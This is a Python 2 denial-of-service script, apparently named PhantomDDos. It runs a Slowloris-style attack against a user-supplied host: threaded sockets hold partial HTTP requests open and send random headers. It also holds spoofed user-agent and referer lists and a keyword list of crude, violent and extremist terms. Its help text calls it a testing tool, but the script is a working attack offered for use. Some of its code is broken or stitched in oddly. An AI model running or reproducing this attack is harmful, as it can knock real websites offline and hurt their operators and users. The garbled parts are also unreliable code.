import os, sys, time
import socket, thread
import random
from threading import Lock
 

COLOR_BLACK     = 0
COLOR_RED       = 1
COLOR_GREEN     = 2
COLOR_YELLOW    = 3
COLOR_BLUE      = 4
COLOR_PINK      = 5
COLOR_CYAN      = 6
COLOR_WHITE     = 7
COLOR_RESET     = 9

def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)


def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')                                     
	headers_referers.append('http://www.usatoday.com/search/results?q=')                      
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        
	headers_referers.append('http://www.google.com/?q=')                                      
	headers_referers.append('http://www.usatoday.com/search/results?q=')                     
	headers_referers.append('http://engadget.search.aol.com/search?q=')                      
	headers_referers.append('http://www.bing.com/search?q=')                                   
	headers_referers.append('http://search.yahoo.com/search?p=')                               
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')

	
def keyword_list():
        global keyword_top
        keyword_top.append('RootPhantom')
        keyword_top.append('Suicide')
        keyword_top.append('Sex')
        keyword_top.append('Pussy')
        keyword_top.append('Killing')
        keyword_top.append('I fuck you up')
        keyword_top.append('Ebola')
        keyword_top.append('Knock Knock')
        keyword_top.append('Toast')
        keyword_top.append('Sorry.. Not')
        keyword_top.append('Dirty Bitch')
        keyword_top.append('ISIS')
        keyword_top.append('Wild and Wet')
        keyword_top.append('1337')
        keyword_top.append('PhantomDos')
        keyword_top.append('PhantomSquad')
        keyword_top.append('Hacker')
        keyword_top.append('DDOS')
        keyword_top.append('Love to fight')
        keyword_top.append('TICK TICK TOCK')
        keyword_top.append('Xbox One')
        keyword_top.append('PSN')
        keyword_top.append('ELITE')
        keyword_top.append('ANON')
        keyword_top.append('DAT BOI')
        keyword_top.append('Anonymous')
        keyword_top.append('DJ')

	headers_referers.append('http://' + host + '/')
	return(headers_referers)

def inc_counter():
	global request_counter
	request_counter+=45

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1

def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 160)
		out_str += chr(a)
	return(out_str)

 
 
# settings and stuff
host = None
num_threads = 6
port = 80
dead = False
path = "/"
connection_amount = 20
 
 
 
def out (n):
        sys.stdout.write(n)
def reset_effects ():
        out("\x1b[0m")
 
def exit ():
        reset_effects()
        print ""
        sys.exit(0)
 
def helptext ():
        print "Usage: %s is 1.1 for GNU/Linux - Free Open Dos and DDos testing tool <hostname> [-t] [-c] [-p]\n" % sys.argv[0]
        print " EX. python PhantomDDos.py www.website.com -t 1000 -c 1000 -p 80"
        print ""
        print " Supports attacks: HTTP"
        print ""
        print "   -t\t\tSet number of threads"
        print "   -c\t\tSet number of connections per thread"
        print "   -p\t\tSet host port number"
        print ""
        print " UPDATES!!! 1.2 PATCH UDP DDOS"
        print ""
        print "Contact for any BUGS or GLITCHES on Twitter @RootPhantom. Your feedback is helpfull"
        exit()
 
def main (args):
        global host, port, num_threads, connection_amount
        pname = args[0]
        i = 1
        if len(args) == 1:
                helptext()
        while i < len(args):
                a = args[i]
               
                # different flags
               
                if a == "--help":
                        helptext()
                elif a == "-t":
                        i += 1
                        num_threads = int(args[i])
                elif a == "-p":
                        i += 1
                        port = int(args[i])
                elif a == "-c":
                        i += 1
                        connection_amount = int(args[i])
                elif host == None:
                        host = args[i]
                else:
                        print "Invalid argument '%s'" % args[i]
                        exit()
               
                i += 1
        if host == None:
                print "Enter a hostname"
                exit()
        start() #start going
 
 
 
# each thread happens in here
def sender (num):
        global dead
       
       
        def col ():
                color = (num % 6) + 1
                out("\x1b[%d;30m%02d\x1b[49;39m" % (color + 40, num))
       
        col()
        print " * | Phantom %d started" % num
       
        cons = []
       
        # connect to the server various times
        while True:
                bleh = False
                for i in range (connection_amount):
                        s = socket.socket()
                        cons += [s]
                        try:
                                s.connect((host, port))
                        except:
                                col()
                                print " # | - ERROR IN THREAD %d: COULD NOT CONNECT" % num
                                bleh = True
                if bleh:
                        continue
                               
                col()
                print " O | Thread %d opened %d connections" % (num, connection_amount)
               
                header = "GET %s HTTP/1.1\r\n" % path
                fulldata  = "Host: localhost\r\n"
                fulldata += "User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\r\n"
                fulldata += "Accept-Language: en-US,en;q=0.8\r\n"
                fulldata += "\r\n"
               
                # send a beginning header
                try:
                        for c in cons:
                                c.send(header + fulldata)
                except:
                        bleh = True
               
                i = 0
                cap = 100
                while i < cap and not bleh:
                        # send random headers that don't mean anything
                        data  = chr(65 + int(random.random() * 26))
                        data += chr(97 + int(random.random() * 26)) + chr(97 + int(random.random() * 26))
                        data += ": "
                        data += chr(65 + int(random.random() * 26)) + chr(97 + int(random.random() * 26)) + chr(97 + int(random.random() * 26))
                        data += chr(97 + int(random.random() * 26)) + chr(97 + int(random.random() * 26)) + chr(97 + int(random.random() * 26))
                        i += 1
                        for c in cons:
                                try:
                                        c.send(data)
                                except:
                                        bleh = True
                        col()
                        print " > | Thread %d sent some data (%d/%d)" % (num, i, cap)
                       
                        # wait three seconds between each header
                        time.sleep(3)
               
                # if something went wrong
                if bleh:
                        for c in cons:
                                try:
                                        c.close()
                                except:
                                        pass
                        col()
                        print " X | :( Thread %d bleh, restart" % num
                        cons = []
                        continue
               
                # nothing went wrong after 100 headers, restart (probably should take this part out, and have it send indefinately)
                time.sleep(2)
                for c in cons:
                        c.close()
                cons = []
                col()
                print " < | Thread %d closed all connections" % num
 
 
def start ():
        # show a neat banner
        print "/------------------------------------------------------\\"
        h_on  = "\x1b[37;1m"
        h_off = "\x1b[39;22m"
       
        print " Targeting %s%s%s at port %s%d%s using %s%d%s threads" % (h_on, host, h_off, h_on, port, h_off, h_on, num_threads, h_off)
       
        print "\\------------------------------------------------------/"
       
        # you still have time to turn back
        time.sleep(1)
       
        # start threads
        for i in range(num_threads):
                thread.start_new_thread(sender,(i,))
                time.sleep(0.1)
       
        # wait for keyboard interrupt
        try:
                while not dead: pass
        except KeyboardInterrupt:
                print "\n\n - Caught <Ctrl - C>\n"
                exit()
 
 

main(sys.argv)

exit()
